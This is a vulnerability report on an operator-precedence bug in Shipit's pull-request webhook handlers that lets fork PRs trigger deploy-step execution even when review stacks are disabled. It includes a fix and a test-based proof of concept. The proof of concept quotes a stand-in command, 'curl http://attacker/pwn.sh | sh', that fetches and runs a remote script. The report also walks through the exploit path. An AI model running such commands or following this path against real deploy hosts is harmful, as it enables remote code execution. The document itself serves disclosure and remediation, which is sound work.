### Title
`OpenedHandler#provision?` / `ReopenedHandler#unarchive?` operator-precedence bug lets `review_stacks_enabled: false` be bypassed, enabling unattended execution of attacker-controlled `shipit.yml` deploy steps on the deploy host - (File: `app/models/shipit/webhooks/handlers/pull_request/opened_handler.rb`, `app/models/shipit/webhooks/handlers/pull_request/reopened_handler.rb`)

### Summary
`OpenedHandler#provision?` and the structurally-identical `ReopenedHandler#unarchive?` AND `repository.review_stacks_enabled` only with the `allow_all` branch of the `||` chain, not with the `allow_with_label`/`prevent_with_label` branches, so a repository configured with `review_stacks_enabled: false` but `provisioning_behavior: prevent_with_label` (or `allow_with_label`) still auto-creates/unarchives a `ReviewStack` from an unprivileged PR. Once created, the review stack's `branch` is the PR head ref from the attacker's fork, and provisioning ultimately runs `TaskCommands#perform`/`deploy_spec.deploy_steps` through `Command#start` → `PTY.spawn`, executing whatever the attacker put in `shipit.yml` on the deploy host.

### Finding Description
The intended binding is: `repository.review_stacks_enabled == false ⇒ no ReviewStack is created or unarchived for any PR on that repository`, regardless of `provisioning_behavior`. The actual code breaks this binding:

```ruby
# app/models/shipit/webhooks/handlers/pull_request/opened_handler.rb
def provision?
  repository.review_stacks_enabled &&
    repository.provisioning_behavior_allow_all? ||
    (repository.provisioning_behavior_allow_with_label? && pull_request_has_provisioning_label?) ||
    (repository.provisioning_behavior_prevent_with_label? && !pull_request_has_provisioning_label?)
end
``` [1](#0-0) 

Because `&&` binds tighter than `||`, this parses as `(review_stacks_enabled && allow_all?) || (allow_with_label? && has_label?) || (prevent_with_label? && !has_label?)`. `review_stacks_enabled` is only checked against the first disjunct. If an operator has `review_stacks_enabled = false` while `provisioning_behavior` is `allow_with_label` or `prevent_with_label` (a config state that can exist, e.g. left over from before disabling the feature, or the enum's non-`allow_all` default), the second and third disjuncts are still evaluated purely on label presence and can return `true`, so `respond_to_pull_request_opened?` fires and `ReviewStackAdapter#find_or_create!` runs. The identical bug exists in `ReopenedHandler#unarchive?`. [2](#0-1) 

By contrast, `LabeledHandler#respond_to_label_change?` correctly ANDs `review_stacks_enabled` across the *entire* disjunction (`repository.review_stacks_enabled && (archive? || unarchive?)`), confirming the intended invariant and that `OpenedHandler`/`ReopenedHandler` diverge from it. [3](#0-2) 

Exploit flow: attacker opens a PR against the target repo (`ReviewStackAdapter#create!` sets `branch: params.pull_request.head.ref` from the attacker's fork) and, if `provisioning_behavior: prevent_with_label`, simply does nothing (no label) to satisfy `!pull_request_has_provisioning_label?`; the stack is created and queued via `Shipit::ReviewStackProvisioningQueue.add(stack)`. [4](#0-3) 
The queue later provisions it (`stack.provisioner.up`), and the review stack's tasks call into `TaskCommands#steps`/`#perform`, which reads `@task.definition.steps` (backed by `DeploySpec::FileSystem#deploy_steps`, i.e. `config('deploy','override')` from the `shipit.yml` checked out at the PR branch HEAD) and wraps each command in `Command.new(command_line, env:, chdir: steps_directory)`. [5](#0-4) [6](#0-5) 
`Command#start` then executes it unfiltered via `PTY.spawn(unbundled_env, *interpolated_arguments, chdir: @chdir)`, with `unbundled_env` merging in the task's environment. [7](#0-6) 
There is no allow-list, sandboxing, or command validation anywhere in this path.

This bypasses the operator's expectation that `review_stacks_enabled: false` is a full kill-switch for PR-driven provisioning; `verify_signature`/webhook auth is not the broken control here — the webhook is a legitimate, correctly-signed event from GitHub for a PR the attacker legitimately opened. The broken control is purely the `provision?`/`unarchive?` precedence logic.

### Impact Explanation
An unprivileged GitHub user who can open a PR against a repository configured with `review_stacks_enabled: false` and `provisioning_behavior: prevent_with_label` (or `allow_with_label` with the attacker able to apply the label on their own fork context / on repos they influence) can force creation and provisioning of a `ReviewStack` tracking their own fork branch, and have arbitrary `deploy.override` shell commands from that branch's `shipit.yml` executed on the Shipit deploy host with the task's environment (`Command#unbundled_env`, `TaskCommands#env`). This is Critical: remote code execution on the deploy host, repeatable per PR/per repository that has this specific configuration combination.

### Likelihood Explanation
Exploitability is conditioned on a specific repository configuration: `review_stacks_enabled: false` combined with `provisioning_behavior` set to `allow_with_label` or `prevent_with_label` (rather than left at whatever default/`allow_all` state correctly gates on `review_stacks_enabled`). This is plausible (e.g., an operator toggling the feature off without resetting `provisioning_behavior`) but is not universal across all Shipit deployments — it requires this non-default combination to exist. Where it does exist, attacker cost is trivial: open a PR (and, for `prevent_with_label`, do nothing) from a fork the attacker controls.

### Recommendation
Fix the operator precedence in both `OpenedHandler#provision?` and `ReopenedHandler#unarchive?` so `review_stacks_enabled` gates the entire expression, matching `LabeledHandler`:
```ruby
def provision?
  repository.review_stacks_enabled &&
    (repository.provisioning_behavior_allow_all? ||
     (repository.provisioning_behavior_allow_with_label? && pull_request_has_provisioning_label?) ||
     (repository.provisioning_behavior_prevent_with_label? && !pull_request_has_provisioning_label?))
end
```
Apply the analogous fix to `ReopenedHandler#unarchive?`.

### Proof of Concept
```ruby
# test/models/shipit/webhooks/handlers/pull_request/opened_handler_test.rb
test "does not create/provision a stack when review_stacks_enabled is false, even if provisioning_behavior is prevent_with_label and label absent" do
  repository = shipit_repositories(:shipit)
  repository.review_stacks_enabled = false
  repository.provisioning_behavior = :prevent_with_label
  repository.provisioning_label_name = "pull-requests-label"
  repository.save!

  payload = payload_parsed(:pull_request_opened)
  payload["pull_request"]["labels"] = [] # no label -> prevent_with_label unarchive/provision branch would be true

  assert_no_difference -> { Shipit::Stack.count } do
    OpenedHandler.new(payload).process
  end
end
```
This currently fails (a stack IS created) because the precedence bug lets the `prevent_with_label?` branch fire independent of `review_stacks_enabled`. A follow-up assertion, chaining into `TaskCommands`, would stub `DeploySpec::FileSystem#deploy_steps` to return `["curl http://attacker/pwn.sh | sh"]` and assert `Command.new` is invoked with that exact string once the created stack is provisioned/deployed, demonstrating the full path to `Command#start`/`PTY.spawn`.

    def start(&block)
      return if @started

      @control_block = block
      @out = @pid = nil
      FileUtils.mkdir_p(@chdir)
      begin
        @out, child_in, @pid = PTY.spawn(unbundled_env, *interpolated_arguments, chdir: @chdir)
        child_in.close
      rescue Errno::ENOENT
        raise NotFound, "#{Shellwords.split(interpolated_arguments.first).first}: command not found"
      rescue Errno::EACCES
        raise Denied, "#{Shellwords.split(interpolated_arguments.first).first}: Permission denied"
      end
      @started = true
      self
    end
